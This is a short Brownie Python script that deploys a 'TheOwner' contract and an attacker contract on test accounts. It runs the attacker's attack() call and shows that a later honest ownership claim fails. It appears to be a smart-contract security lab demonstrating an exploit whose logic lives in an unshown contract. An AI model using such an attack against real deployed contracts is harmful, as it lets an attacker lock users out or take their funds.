from brownie import TheOwner, TheOwnerAttack, accounts, network


def main():
    owner = accounts[0]
    user1 = accounts[1]
    user2 = accounts[2]
    attacker = accounts[3]

    the_owner = TheOwner.deploy({"from": owner})
    the_owner_attack = TheOwnerAttack.deploy(the_owner, {"from": attacker})

    the_owner.claimOwner({"from": user1, "amount": "1 ether"})
    print(f"current Owner is {the_owner.owner()}")

    the_owner_attack.attack({"from": attacker, "amount": "2 ether"})
    print(f"current Owner is {the_owner.owner()}")

    try:
        the_owner.claimOwner({"from": user2, "amount": "3 ether"})

    except:
        pass

    print(f"current Owner is {the_owner.owner()}")

    network.disconnect()
